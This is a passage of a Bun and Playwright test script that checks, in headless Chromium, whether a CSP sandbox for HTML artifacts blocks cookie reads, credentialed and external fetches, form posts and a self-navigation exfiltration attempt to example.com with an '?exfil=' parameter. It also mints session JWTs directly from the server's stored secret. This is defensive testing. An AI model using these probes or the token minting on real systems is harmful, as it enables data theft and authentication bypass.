#!/usr/bin/env bun
/**
 * Real-Chromium load-bearing probe for the HTML Artifacts CSP sandbox
 * boundary (Issue #1312, docs/design/html-artifacts.md §3 / §8, AC "V1").
 *
 * This is NOT a confirmatory regression test -- it is the ONLY thing that
 * proves premises P1 (the `sandbox` response-header directive produces an
 * opaque origin, even with `allow-scripts`, in a real browser), P2 (the
 * `SameSite=Lax` auth cookie withholds itself from a same-origin fetch made
 * by that opaque-origin document), P6 (`Sec-Fetch-Dest` gating -- fail
 * closed to the viewer shell for anything that isn't a genuine
 * iframe-embedded load), and P7 (the viewer shell's `frame-src 'self'`
 * blocks a child artifact's navigations, INCLUDING self-navigation --
 * closing the exfiltration-via-`location=` hole) actually hold. Arms 0-5
 * probe the artifact's own execution context; arms 6-7 (added alongside
 * the navigation-jail shell) probe the shell's `frame-src` wall and the
 * `Sec-Fetch-Dest` gate respectively -- see their own inline comments.
 * Structural template:
 * `scripts/run-preview-sandbox-browser-check.mjs` (Issue #1162 precedent) --
 * same `playwright-core` / `chromium.launch()` driver, same Chromium
 * executable resolution helper (copied verbatim, including the aarch64 snap
 * fallback), same `expect(cond, label, detail)` mini-harness, same exit-code
 * convention (0 = all pass, 1 = a blocking assertion failed = real
 * regression, 2 = bad usage / environment problem).
 *
 * ============================================================================
 * WHAT THIS SCRIPT DOES
 * ============================================================================
 *
 * 1. Boots a REAL, disposable server instance in-process (dynamically
 *    imports `packages/server/src/index.ts` after setting
 *    `AGENT_CONSOLE_HOME` / `AUTH_MODE=multi-user` / `PORT` in
 *    `process.env`, mirroring how `bun run src/index.ts` boots it -- see
 *    "SERVER LIFECYCLE" below for why in-process rather than a subprocess).
 * 2. Mints a REAL session credential directly against that instance (see
 *    "CREDENTIAL-ISSUANCE SUBSTITUTION" below -- this is a recorded proxy
 *    per pre-pr-completeness.md Q13, not a bypass of anything this probe
 *    verifies, and it never weakens or bypasses the real `/api/auth/login`
 *    endpoint itself -- that endpoint is never called by this script and
 *    stays fully password-protected for anyone else on the network the
 *    whole time this script runs).
 * 3. Creates a real quick session (`POST /api/sessions`) and calls the real
 *    `create_html_artifact` MCP tool over real JSON-RPC HTTP
 *    (`POST /mcp`, per the `dev-environment-quirks` skill's "driving MCP
 *    against a throwaway instance you started yourself" pattern -- no
 *    pre-registered MCP client, just JSON-RPC over `fetch`).
 * 4. Launches real headless Chromium and drives BOTH the artifact's own
 *    execution context (arms 0-4, via `postMessage` -- the harness protocol
 *    mandated by the AC, since an opaque-origin iframe's DOM is unreadable
 *    from outside) AND two same-run positive controls (a normal,
 *    non-sandboxed authenticated page on the same server).
 * 5. Asserts, exits 0/1/2, prints full arm-by-arm results.
 *
 * ============================================================================
 * SERVER LIFECYCLE: in-process import, not a subprocess
 * ============================================================================
 *
 * `packages/server/src/index.ts` is a top-level-effectful module (it calls
 * `Bun.serve()` at module-eval time, no exported `main()`). This script
 * dynamically `import()`s it directly, in the SAME Bun process as the rest
 * of this script, rather than spawning `bun run src/index.ts` as a child
 * process. This is a deliberate choice over the shell-out alternative the
 * AC also allows: it lets step 2 below reach the *exact* shared database
 * connection and on-disk JWT secret the running server itself uses, via
 * ordinary module-cache identity (Bun's module cache keys by resolved
 * absolute file path, not by the import specifier string, so this script's
 * `import('../packages/server/src/database/connection.ts')` and
 * `app-context.ts`'s `import('./database/connection.js')` resolve to the
 * SAME cached module, and `initializeDatabase()`'s no-argument fast path
 * therefore returns the SAME live `Kysely` instance) -- no second SQLite
 * connection, no IPC, no subprocess-boundary credential smuggling.
 *
 * ============================================================================
 * CREDENTIAL-ISSUANCE SUBSTITUTION (pre-pr-completeness.md Q13)
 * ============================================================================
 *
 * V1's credentialed-fetch arm and both positive controls need a REAL
 * authenticated session (real user row, real signed JWT) against a REAL
 * `AUTH_MODE=multi-user` instance -- P2 is specifically about `SameSite`,
 * which is a no-op to test in `AUTH_MODE=none` (see the AC's "critical
 * environment finding"). This script has no legitimate way to authenticate
 * through the real `/api/auth/login` endpoint interactively (no interactive
 * terminal, and creating a new OS account requires root + would violate
 * `.claude/rules/os-environment-coupling.md` Discipline 2 -- no unilateral
 * OS state changes outside the project's own scope, without owner consent).
 *
 * IMPORTANT (Architect ruling, superseding an earlier draft of this script
 * that monkey-patched `MultiUserMode.prototype.validateOsCredentials` to
 * accept any password): that approach was REJECTED as a security defect,
 * not merely narrowed-but-accepted. Weakening the password check itself,
 * for the whole script run, on a server reachable from the LAN (arm 8
 * needs that reachability by definition), means ANY host that can reach
 * the port during the run window could have authenticated as the operator
 * with any password and reached `POST /api/sessions` (real PTY spawn as
 * the operator's OS identity) -- an RCE window, not just a probe-data leak.
 * Narrowing the network exposure (binding to a single IP instead of
 * `0.0.0.0`) does not fix this: it is a smaller door, not no door, since
 * arm 8 still requires LAN reachability. The fix has to be to the
 * credential mechanism, not the network surface.
 *
 * The actual substitution: this script mints a session JWT DIRECTLY,
 * replicating every step of `MultiUserMode.login()`
 * (`packages/server/src/services/user-mode.ts`) that comes AFTER password
 * validation -- real OS user lookup (`lookupOsUser`), a real upsert against
 * the running server's own live database (`userRepository.upsertByOsUid`),
 * and a real `SignJWT` call using the exact same payload shape, algorithm,
 * and expiry, signed with the REAL per-instance secret the server itself
 * generated and persisted to `<AGENT_CONSOLE_HOME>/jwt-secret` at boot. See
 * `mintRealSessionToken` below.
 *
 * Per Q13's three conditions for a recorded proxy substitution:
 *
 *   1. Upstream and outside: the ONLY thing substituted is the MECHANISM
 *      for OBTAINING a valid session credential -- direct signing instead
 *      of an interactive password entry through the login endpoint. This
 *      sits upstream of and entirely outside the CSP sandbox boundary
 *      chain this probe verifies (P1/P2 are about what an artifact
 *      document can and cannot do once loaded, not about how a test
 *      harness itself proves its own identity to obtain a token). Critically,
 *      this is a STRONGER isolation than the rejected patch: the real
 *      `/api/auth/login` endpoint, and its real password validation, is
 *      NEVER called, weakened, or reachable-with-a-bypass by this script,
 *      at any point -- there is no window, however narrow, during which
 *      anyone else on the network could authenticate without a real
 *      password. Zero repository files are modified.
 *   2. Genuinely provisioned: every step performed IS the real production
 *      mechanism, just invoked directly instead of over HTTP: `lookupOsUser()`
 *      does a real `id` / `getent` lookup of this script's own real OS user
 *      (`os.userInfo()`); `userRepository.upsertByOsUid()` performs a real
 *      INSERT against the SAME live SQLite connection the running server
 *      uses (see "SERVER LIFECYCLE" above); the JWT is signed with the
 *      REAL per-instance secret the disposable server itself generated.
 *      The ENTIRE verification path on the other side --
 *      `MultiUserMode.authenticate()` / `verifyTokenSync()` -- runs
 *      completely unmodified: a forged token, or one signed with the wrong
 *      secret, is rejected by the running server exactly as it would be in
 *      production. This script constructs a credential the production
 *      verification path independently accepts as genuine; it does not
 *      disable that path.
 *   3. Recorded as a proxy, here and in the final run report (see the
 *      script's own log output at "CREDENTIAL ISSUANCE (proxy)").
 *
 * One consequence: this script no longer round-trips the real
 * `POST /api/auth/login` HTTP response, so it can no longer independently
 * verify premise P2's `SameSite=Lax` cookie attribute via a live Set-Cookie
 * header (as an earlier version of this script did). That coverage now
 * lives in `packages/server/src/routes/__tests__/auth.test.ts` (a real,
 * in-process Hono route-level test against the actual `routes/auth.ts`
 * handler) -- see the P2 log line below for the pointer. The cookie THIS
 * script injects into Chromium/`fetch()` still carries `SameSite=Lax` (and
 * `secure` computed via the real `resolveAuthCookieSecure(serverConfig)`
 * call), matching what `routes/auth.ts` sets, so the sandbox-boundary arms
 * that depend on the cookie's actual attributes (P1/P2/P2a) are unaffected.
 *
 * ============================================================================
 * ARM 3 -- THE CONNECT WALL (layer 2), NOT P2 (Architect ruling, 2026-08-16)
 * ============================================================================
 *
 * §3.2's resource CSP has NO `connect-src` override, so `default-src 'none'`
 * governs `connect-src` too -- per the CSP spec this blocks EVERY fetch/XHR
 * a sandboxed artifact document issues, including a same-origin one, before
 * the request ever reaches the network. Arm 3 proves exactly that: the CSP
 * connect-block is the OUTER wall. It does NOT and cannot exercise
 * `SameSite=Lax` (P2, the INNER wall behind it) -- the request never
 * reaches the point where a cookie would or wouldn't be attached, so this
 * arm is structurally unable to distinguish "blocked by CSP" from "blocked
 * by SameSite". P2 is source-verified instead (`SameSite=Lax` asserted
 * against a real Set-Cookie header from the actual `routes/auth.ts` handler
 * in `packages/server/src/routes/__tests__/auth.test.ts` -- this script no
 * longer round-trips the real login endpoint itself, see
 * "CREDENTIAL-ISSUANCE SUBSTITUTION" above) plus a
 * re-verification trigger recorded in docs/design/html-artifacts.md §3.3:
 * any future change that adds `connect-src` to the artifact CSP MUST add a
 * direct cross-site probe of P2 before that change ships.
 *
 * Arm 3 is SCORED (not informational): pass requires BOTH (a) the
 * client-side `fetch()` call rejects with a `TypeError` specifically (the
 * network-level-block failure mode, not merely "did not return a
 * successful body"), AND (b) the server-side request log -- populated by
 * the `Bun.serve` monkey-patch below, at the real network entry point,
 * pathname-specific -- shows ZERO requests to `/api/auth/me` during the
 * sandboxed artifact's execution window, followed later by EXACTLY ONE
 * during the positive control's identical request. The zero-then-one
 * sequence is what attributes that one request to the control rather than
 * the sandbox: a bare "zero from the sandbox" checked in isolation would
 * also pass with logging silently broken or the route name wrong.
 *
 * ============================================================================
 * Usage:
 *   bun scripts/smoke/check-artifact-sandbox-boundary.mjs
 *   PREVIEW_CHECK_CHROMIUM_PATH=/path/to/chrome bun scripts/smoke/check-artifact-sandbox-boundary.mjs
 *
 * Exit codes:
 *   0  all blocking assertions passed
 *   1  one or more blocking assertions failed (a real boundary regression)
 *   2  bad usage / environment problem (no Chromium, harness self-test
 *      failed, server failed to boot, etc.)
 */

import { chromium } from 'playwright-core';
import { existsSync, mkdirSync, rmSync } from 'fs';
import * as os from 'os';
import * as path from 'path';
import { createRequire } from 'module';

const REPO_ROOT = new URL('../..', import.meta.url).pathname;

/**
 * `jose` is a dependency of `packages/server`, not of this script's own
 * directory (`scripts/smoke/` has no `node_modules` of its own, and Bun's
 * module resolution for a bare specifier is rooted at the IMPORTING file's
 * directory, walking up its ancestors only -- it does not search sibling
 * package directories). A bare `import('jose')` from this file therefore
 * fails to resolve even though the disposable server (which lives under
 * `packages/server/src/`) imports it successfully. `createRequire`, rooted
 * at a path inside `packages/server/src/`, resolves it exactly the way
 * that package's own code would, then this script dynamically imports the
 * resolved absolute path -- no new dependency, no duplication of `jose`.
 */
async function importJoseFromServerPackage() {
  const requireFromServer = createRequire(path.join(REPO_ROOT, 'packages/server/src/services/user-mode.ts'));
  const joseEntryPath = requireFromServer.resolve('jose');
  return import(joseEntryPath);
}

// ---------------------------------------------------------------------------
// Chromium resolution -- copied verbatim from the #1162 precedent script
// (scripts/run-preview-sandbox-browser-check.mjs) so both scripts stay
// byte-identical on this shared concern; update both together if either
// changes.
// ---------------------------------------------------------------------------
function resolveChromiumExecutablePath() {
  const envOverride = process.env.PREVIEW_CHECK_CHROMIUM_PATH;
  if (envOverride) {
    if (!existsSync(envOverride)) {
      throw new Error(`PREVIEW_CHECK_CHROMIUM_PATH=${envOverride} does not exist`);
    }
    return envOverride;
  }
  const candidates = [
    '/usr/bin/google-chrome-stable',
    '/usr/bin/google-chrome',
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
    // aarch64 Linux dev machines: the snap chromium's underlying ELF binary
    // (bypasses the snap launcher wrapper's cgroup check). See the
    // chrome-mcp-aarch64-setup skill.
    '/snap/chromium/current/usr/lib/chromium-browser/chrome',
  ];
  for (const p of candidates) {
    if (existsSync(p)) return p;
  }
  throw new Error(
    `Could not find a Chromium/Chrome executable in any of:\n${candidates.map((p) => `  ${p}`).join('\n')}\n` +
      'Set PREVIEW_CHECK_CHROMIUM_PATH to an explicit path, install Google Chrome, or ' +
      '(aarch64 Linux) run `sudo snap install chromium` -- see the chrome-mcp-aarch64-setup skill.',
  );
}

// ---------------------------------------------------------------------------
// Mini assertion harness -- same shape as the #1162 precedent.
// ---------------------------------------------------------------------------
const failures = [];
const infoLines = [];
let passes = 0;

// Module-level so every exit path (early process.exit() on a fatal harness
// failure, AND the top-level main().catch()) can find it and clean up --
// not just the happy-path fall-through at the bottom of main(). An earlier
// version of this script only cleaned up on the happy path and left several
// disposable AGENT_CONSOLE_HOME trees under /tmp after self-test / arm-0
// failures during development.
let disposableHomeForCleanup;

function expect(cond, label, detail) {
  if (cond) {
    console.log(`  OK    ${label}`);
    passes++;
  } else {
    console.error(`  FAIL  ${label}${detail ? ` -- ${detail}` : ''}`);
    failures.push(label);
  }
}

function info(label, detail) {
  console.log(`  INFO  ${label}${detail ? ` -- ${detail}` : ''}`);
  infoLines.push(label);
}

/** Find a free TCP port by letting the OS assign one, then releasing it. */
function getFreePort() {
  const s = Bun.serve({ port: 0, fetch: () => new Response('') });
  const port = s.port;
  s.stop(true);
  return port;
}

/**
 * Resolve a non-internal (LAN) IPv4 address for this machine, for arm 8
 * (Issue #1366, "header-blind origin"). Auto-detected via
 * `os.networkInterfaces()` rather than hardcoded, since this script may run
 * on a different host than the one the Issue was filed against; override
 * with ARTIFACT_BOUNDARY_LAN_IP for a specific target. Returns null when no
 * such interface exists (e.g. a fully NAT'd/loopback-only sandbox) --
 * arm 8's own precondition check reports and stops rather than simulating.
 */
function resolveLanIPv4() {
  const override = process.env.ARTIFACT_BOUNDARY_LAN_IP;
  if (override) return override;
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name] ?? []) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
  return null;
}

/** Poll GET /health until the disposable server accepts connections. */
async function waitForServerReady(baseUrl, timeoutMs = 15_000) {
  const deadline = Date.now() + timeoutMs;
  let lastErr;
  while (Date.now() < deadline) {
    try {
      const res = await fetch(`${baseUrl}/health`);
      if (res.ok) return;
    } catch (err) {
      lastErr = err;
    }
    await Bun.sleep(150);
  }
  throw new Error(`Disposable server did not become ready within ${timeoutMs}ms: ${lastErr}`);
}

/**
 * Mint a REAL session credential directly, replicating every step of
 * `MultiUserMode.login()` (`services/user-mode.ts`) that runs AFTER
 * password validation -- see the header comment "CREDENTIAL-ISSUANCE
 * SUBSTITUTION" for the full Q13 justification and the security rationale
 * for why this replaces the earlier `validateOsCredentials` monkey-patch.
 * MUST be called AFTER the disposable server is ready: both the JWT secret
 * file and the database singleton this function reaches into are created
 * during the server's own boot sequence.
 */
async function mintRealSessionToken(disposableHome, osUsername) {
  const { lookupOsUser } = await import('../../packages/server/src/services/os-user-lookup.ts');
  const { initializeDatabase } = await import('../../packages/server/src/database/connection.ts');
  const { SqliteUserRepository } = await import('../../packages/server/src/repositories/sqlite-user-repository.ts');
  const { SignJWT } = await importJoseFromServerPackage();

  const userInfo = await lookupOsUser(osUsername);
  if (!userInfo) {
    throw new Error(`mintRealSessionToken: lookupOsUser('${osUsername}') returned null -- cannot mint a session for this OS user`);
  }

  // Fast path (see "SERVER LIFECYCLE" header comment): initializeDatabase()
  // called with NO dbPath argument returns the SAME cached Kysely instance
  // the running server itself uses -- not a second/divergent connection.
  const db = await initializeDatabase();
  const userRepository = new SqliteUserRepository(db);
  const authUser = await userRepository.upsertByOsUid(userInfo.uid, osUsername, userInfo.homeDir);

  // Real per-instance secret, written to disk by the server's own
  // `MultiUserMode.create()` at boot (`services/user-mode.ts`'s
  // `JWT_SECRET_FILE` constant is the literal string 'jwt-secret'), read
  // directly rather than reaching into the class instance -- this script no
  // longer touches `MultiUserMode` at all.
  const jwtSecret = new Uint8Array(await Bun.file(path.join(disposableHome, 'jwt-secret')).arrayBuffer());

  // EXACT payload shape / algorithm / expiry `MultiUserMode.login()` signs.
  // Any drift here would mint a token the real, unmodified
  // `authenticate()` / `verifyTokenSync()` path legitimately rejects --
  // this is a parallel construction of what a real login would have
  // produced, not a bypass of the verification side.
  const token = await new SignJWT({ username: authUser.username, home: authUser.homeDir })
    .setProtectedHeader({ alg: 'HS256' })
    .setSubject(authUser.id)
    .setIssuedAt()
    .setExpirationTime('7d')
    .sign(jwtSecret);

  return { token, authUser };
}

// ---------------------------------------------------------------------------
// MCP JSON-RPC helpers -- real HTTP against the disposable server's own
// /mcp endpoint (dev-environment-quirks skill's "driving MCP against a
// throwaway instance you started yourself" pattern: no pre-registered MCP
// client, raw JSON-RPC over fetch).
// ---------------------------------------------------------------------------
async function initializeMcp(baseUrl) {
  const res = await fetch(`${baseUrl}/mcp`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Accept: 'application/json, text/event-stream' },
    body: JSON.stringify({
      jsonrpc: '2.0',
      method: 'initialize',
      params: { protocolVersion: '2025-03-26', capabilities: {}, clientInfo: { name: 'artifact-boundary-probe', version: '1.0.0' } },
      id: 1,
    }),
  });
  const sessionId = res.headers.get('mcp-session-id') ?? '';
  await fetch(`${baseUrl}/mcp`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Accept: 'application/json, text/event-stream',
      'Mcp-Session-Id': sessionId,
    },
    body: JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' }),
  });
  return sessionId;
}

async function callMcpTool(baseUrl, mcpSessionId, name, args) {
  const res = await fetch(`${baseUrl}/mcp`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Accept: 'application/json, text/event-stream',
      'Mcp-Session-Id': mcpSessionId,
    },
    body: JSON.stringify({ jsonrpc: '2.0', method: 'tools/call', params: { name, arguments: args }, id: 2 }),
  });
  const json = await res.json();
  const text = json.result?.content?.[0]?.text;
  if (json.result?.isError) {
    throw new Error(`MCP tool ${name} returned an error result: ${text}`);
  }
  if (!text) {
    throw new Error(`MCP tool ${name} returned no text content: ${JSON.stringify(json)}`);
  }
  return JSON.parse(text);
}

// ---------------------------------------------------------------------------
// Probe artifact HTML -- the document under test. Executes arm 0 first
// (proof of execution -- gating per the AC: without this signal, every
// other "no failures" result is potentially vacuous), then each wall in the
// specified order, posting a distinctly-typed message per arm to
// `window.parent` (the one channel an opaque origin legitimately leaves
// open -- its DOM is unreadable from outside, hence postMessage as the
// harness protocol, per the AC).
// ---------------------------------------------------------------------------
function buildProbeArtifactHtml() {
  return `<!doctype html>
<html><body>
<script>
(function () {
  function post(type, detail) {
    window.parent.postMessage({ type: type, detail: detail }, '*');
  }

  // Arm 0 (gating): proof of execution.
  post('script-ran', {});

  // Arm 1: document.cookie read.
  try {
    var cookieVal = document.cookie;
    post('cookie-result', { threw: false, value: cookieVal });
  } catch (err) {
    post('cookie-result', { threw: true, message: String(err) });
  }

  // Arm 2: localStorage access.
  try {
    localStorage.setItem('probe', '1');
    var lsVal = localStorage.getItem('probe');
    post('localstorage-result', { threw: false, value: lsVal });
  } catch (err) {
    post('localstorage-result', { threw: true, message: String(err) });
  }

  // Capture securitypolicyviolation events for the fetch/form arms below --
  // corroborating evidence for whichever wall (CSP resource restriction vs.
  // SameSite cookie omission) actually fires. NOTE: this listener is on
  // THIS document (the artifact itself); it does NOT see arm 6's
  // frame-src violation below, which CSP dispatches on the EMBEDDING
  // document (the shell) since frame-src governs the embedder's policy
  // over a child's navigation, not the child's own policy. The harness
  // script separately listens for that on the shell page.
  var cspViolations = [];
  document.addEventListener('securitypolicyviolation', function (e) {
    cspViolations.push({ violatedDirective: e.violatedDirective, blockedURI: e.blockedURI, disposition: e.disposition });
  });

  // Arm 3: credentialed same-origin fetch to the auth echo route.
  fetch('/api/auth/me', { credentials: 'include' })
    .then(function (res) {
      return res.json().then(function (body) {
        post('credentialed-fetch-result', { networkOk: true, status: res.status, body: body, cspViolations: cspViolations.slice() });
      });
    })
    .catch(function (err) {
      post('credentialed-fetch-result', {
        networkOk: false,
        message: String(err),
        errorName: err && err.name,
        cspViolations: cspViolations.slice(),
      });
    })
    .then(function () {
      // Arm 4: external fetch (CSP resource-restriction should block this
      // regardless of credentials -- default-src 'none', no allowance).
      return fetch('https://example.com/')
        .then(function () {
          post('external-fetch-result', { networkOk: true, cspViolations: cspViolations.slice() });
        })
        .catch(function (err) {
          post('external-fetch-result', { networkOk: false, message: String(err), cspViolations: cspViolations.slice() });
        });
    })
    .then(function () {
      // Arm 5: external form POST (form-action 'none' should block this).
      // Detection strategy: a securitypolicyviolation event with
      // violatedDirective 'form-action' is the authoritative signal (CSP
      // spec-mandated for a blocked form submission); the absence of a page
      // navigation away from this document by the time we report is used
      // only as corroborating evidence, since it is also consistent with a
      // submission that is merely slow -- the violation event is preferred
      // because it is unambiguous.
      var form = document.createElement('form');
      form.action = 'https://example.com/submit';
      form.method = 'POST';
      document.body.appendChild(form);
      form.submit();
      return new Promise(function (resolve) {
        setTimeout(function () {
          var formViolation = cspViolations.find(function (v) { return v.violatedDirective.indexOf('form-action') !== -1; });
          post('external-form-result', {
            navigatedAway: window.location.href.indexOf('example.com') !== -1,
            formActionViolationObserved: !!formViolation,
            cspViolations: cspViolations.slice(),
          });
          resolve();
        }, 500);
      });
    })
    .then(function () {
      // Arm 6: self-navigation exfiltration attempt (P7 -- a script-driven
      // self-navigation to an external origin, the vulnerability this
      // shell's frame-src exists to close). Uses https://example.com/ for
      // consistency with arms 4/5's existing external target (both already
      // use example.com in this same script), rather than an unverified
      // .invalid-TLD assumption.
      //
      // MUST run LAST, after every other arm has already posted its
      // result: empirically (verified against real Chromium), a
      // frame-src-blocked navigation attempt does not merely fail
      // silently like a blocked fetch() does -- it replaces this
      // document's entire content with a Chromium error interstitial
      // (chrome-error://chromewebdata/), tearing down this JS realm.
      // Running this arm any earlier would have prevented arms 3-5 from
      // ever completing (discovered when arm 5 stopped reporting once
      // arm 6 was first added ahead of it).
      try {
        window.location = 'https://example.com/?exfil=' + encodeURIComponent(document.title || 'probe');
      } catch (err) {
        post('self-navigation-result', { attempted: true, threw: true, message: String(err) });
      }
      setTimeout(function () {
        // If this fires at all, this document's JS context survived the
        // navigation attempt -- i.e. it was blocked outright rather than
        // replaced with an interstitial. Given the interstitial-replacement
        // behavior documented above, this message's ABSENCE is EXPECTED
        // and is NOT itself evidence of a successful exfiltration -- it is
        // corroborating evidence only when present. The harness script's
        // Playwright-level child-frame URL check (never reaches the actual
        // external target) and the shell page's securitypolicyviolation
        // capture are the definitive signals.
        post('self-navigation-result', { attempted: true, threw: false, hrefAfterAttempt: window.location.href });
      }, 300);
    });
})();
</script>
</body></html>`;
}

async function main() {
  process.chdir(REPO_ROOT);

  const executablePath = resolveChromiumExecutablePath();
  console.log(`==> using Chromium executable: ${executablePath}`);

  // -------------------------------------------------------------------
  // Server bring-up: disposable AGENT_CONSOLE_HOME, multi-user auth mode
  // (per the AC's "critical environment finding" -- AUTH_MODE=none would
  // make the credentialed-fetch arm and P2 unverifiable, since
  // SingleUserMode ignores cookies entirely).
  // -------------------------------------------------------------------
  const disposableHome = path.join(os.tmpdir(), `agent-console-1312-v1-verify-${process.pid}-${Date.now()}`);
  disposableHomeForCleanup = disposableHome;
  mkdirSync(disposableHome, { recursive: true });
  console.log(`==> disposable AGENT_CONSOLE_HOME: ${disposableHome}`);

  const port = getFreePort();
  const baseUrl = `http://127.0.0.1:${port}`;
  console.log(`==> disposable server target: ${baseUrl}`);

  process.env.AGENT_CONSOLE_HOME = disposableHome;
  process.env.AUTH_MODE = 'multi-user';
  process.env.PORT = String(port);
  // 0.0.0.0 (all interfaces), not 127.0.0.1: arm 8 (Issue #1366) needs the
  // disposable server reachable over the LAN interface, not just loopback.
  // This does not change arms 0-7 -- they keep using 127.0.0.1/localhost
  // URLs internally, and 0.0.0.0 still accepts loopback connections.
  process.env.HOST = '0.0.0.0';
  process.env.LOG_LEVEL = process.env.LOG_LEVEL ?? 'warn';

  // SERVER-SIDE REQUEST OBSERVATION (arm 3 / connect-wall assertion, see
  // header comment "ARM 3"): monkey-patch the GLOBAL `Bun.serve` (at
  // RUNTIME, in this process only, zero repository files modified) so
  // every request the
  // disposable server's real `Bun.serve({ fetch: app.fetch, ... })` call
  // receives is also recorded here, by pathname, before being forwarded
  // UNMODIFIED to the real `app.fetch`. This is pure instrumentation, not
  // a substitution -- the original handler always runs and its response is
  // returned unchanged. It is the only way to get server-side,
  // per-route/pathname visibility without editing `routes/auth.ts` or
  // `middleware/auth.ts` (both out of scope for this change):
  // `userMode.authenticate()` is shared by every authenticated route (GET
  // /api/auth/me AND GET /api/artifacts/:id, among others), so patching it
  // instead would conflate the artifact iframe's own initial navigation
  // with arm 3's embedded fetch attempt.
  const requestLog = [];
  const originalBunServe = Bun.serve;
  Bun.serve = (options) => {
    const originalFetch = options.fetch;
    return originalBunServe({
      ...options,
      fetch: async (req, server) => {
        try {
          requestLog.push({ pathname: new URL(req.url).pathname, timestamp: Date.now() });
        } catch {
          // Never let observation itself break the request path.
        }
        return originalFetch(req, server);
      },
    });
  };
  console.log(
    '==> SERVER-SIDE REQUEST OBSERVATION: Bun.serve monkey-patched to record every request pathname ' +
      '(runtime-only, this process, zero repo files modified, pass-through to the real app.fetch unmodified).',
  );

  console.log('==> booting disposable server in-process...');
  await import('../../packages/server/src/index.ts');
  await waitForServerReady(baseUrl);
  console.log('==> disposable server is ready');

  // -----------------------------------------------------------------
  // Real session credential: minted directly (see CREDENTIAL-ISSUANCE
  // SUBSTITUTION above) rather than through the real /api/auth/login HTTP
  // endpoint -- that endpoint is never called by this script and stays
  // fully password-protected for anyone else the whole time it runs.
  // -----------------------------------------------------------------
  const osUsername = os.userInfo().username;
  const { token: sessionToken, authUser: mintedAuthUser } = await mintRealSessionToken(disposableHome, osUsername);
  console.log(`==> real session credential minted for OS user '${osUsername}' (userId=${mintedAuthUser.id})`);
  const { AUTH_COOKIE_NAME } = await import('../../packages/server/src/lib/auth-constants.ts');
  const { resolveAuthCookieSecure, serverConfig } = await import('../../packages/server/src/lib/server-config.ts');
  // Construct the cookie THIS script injects with the exact same
  // attributes `routes/auth.ts`'s setCookie(...) call uses -- `secure` via
  // the real resolveAuthCookieSecure(serverConfig) call (not hardcoded),
  // `sameSite`/`path`/`httpOnly` matching its literal values. Since this
  // script no longer round-trips the real login response, it can no longer
  // independently verify P2's SameSite=Lax via a live Set-Cookie header --
  // that coverage now lives in routes/__tests__/auth.test.ts (see the
  // CREDENTIAL-ISSUANCE SUBSTITUTION header comment for the pointer).
  const authCookie = {
    name: AUTH_COOKIE_NAME,
    value: sessionToken,
    path: '/',
    httpOnly: true,
    secure: resolveAuthCookieSecure(serverConfig),
    sameSite: 'Lax',
  };
  info(
    "P2 dependency: the injected auth cookie carries SameSite=Lax (matching routes/auth.ts's setCookie(...) call)",
    'independently verified via a real Set-Cookie header in packages/server/src/routes/__tests__/auth.test.ts, ' +
      'not re-verified here since this script no longer calls the real login endpoint',
  );

  // -----------------------------------------------------------------
  // Real session + real MCP tool call to create the probe artifact.
  // -----------------------------------------------------------------
  const cookieHeader = `${authCookie.name}=${authCookie.value}`;
  const sessionRes = await fetch(`${baseUrl}/api/sessions`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Cookie: cookieHeader },
    body: JSON.stringify({ type: 'quick', locationPath: disposableHome }),
  });
  if (!sessionRes.ok) {
    throw new Error(`Session creation failed (status ${sessionRes.status}): ${await sessionRes.text()}`);
  }
  const { session } = await sessionRes.json();
  console.log(`==> real session created: ${session.id} (createdBy=${session.createdBy})`);

  const mcpSessionId = await initializeMcp(baseUrl);
  const toolResult = await callMcpTool(baseUrl, mcpSessionId, 'create_html_artifact', {
    content: buildProbeArtifactHtml(),
    title: 'artifact-sandbox-boundary-probe',
    sessionId: session.id,
  });
  console.log(`==> artifact created via real MCP call: ${JSON.stringify(toolResult)}`);
  const artifactUrl = `${baseUrl}/api${toolResult.path}`;
  // The navigation-jail shell (docs/design/html-artifacts.md §3.3 P6/P7,
  // routes/artifacts-viewer.ts) -- this is now the mandatory top-level
  // entry point; the raw endpoint above only serves bytes to a genuine
  // iframe-embedded load (Sec-Fetch-Dest: iframe).
  const artifactShellUrl = `${baseUrl}${toolResult.path}`;

  // Positive control for P7 (arm 6's "wall exists" proof): the shell's own
  // CSP header, checked directly against the real production endpoint over
  // real HTTP, imported (not replicated) from the production module.
  const artifactViewerModule = await import('../../packages/server/src/routes/artifacts-viewer.ts');
  const shellHeaderRes = await fetch(artifactShellUrl, { headers: { Cookie: cookieHeader } });
  expect(
    shellHeaderRes.headers.get('Content-Security-Policy') === artifactViewerModule.ARTIFACT_SHELL_CSP,
    "positive control: the viewer shell's Content-Security-Policy header is the exact ARTIFACT_SHELL_CSP constant (frame-src 'self' wall exists)",
    `observed=${JSON.stringify(shellHeaderRes.headers.get('Content-Security-Policy'))}`,
  );
  await shellHeaderRes.text();

  // -----------------------------------------------------------------
  // Browser probing.
  // -----------------------------------------------------------------
  const browser = await chromium.launch({
    executablePath,
    headless: true,
    // Chromium's own OS-level process sandbox, unrelated to the CSP
    // `sandbox` directive under test -- disabled for portability across
    // CI/containerized/root environments, standard practice for headless
    // automation (see #1162 precedent for the same note).
    args: ['--no-sandbox'],
  });

  try {
    const context = await browser.newContext();
    // Seed the minted session cookie into the browser's cookie jar for
    // this origin -- constructed above with the SAME SameSite/HttpOnly/
    // Secure attributes routes/auth.ts's setCookie(...) call uses.
    // ALSO seed a second, non-HttpOnly marker cookie for the
    // document.cookie positive control below: the real auth cookie is
    // HttpOnly by production design (routes/auth.ts), so `document.cookie`
    // never exposes it on ANY page, sandboxed or not -- that is ordinary
    // HttpOnly semantics, not the sandbox boundary. Without a
    // JS-readable cookie, the positive control cannot distinguish
    // "environment blocks document.cookie" from "sandbox blocks it".
    const cookieControlName = 'artifact-probe-control';
    const cookieControlValue = 'control-value';
    await context.addCookies([
      {
        name: authCookie.name,
        value: authCookie.value,
        domain: '127.0.0.1',
        path: authCookie.path,
        httpOnly: authCookie.httpOnly,
        secure: authCookie.secure,
        // authCookie.sameSite is a fixed literal ('Lax') constructed above
        // to match routes/auth.ts's setCookie(...) call -- no case
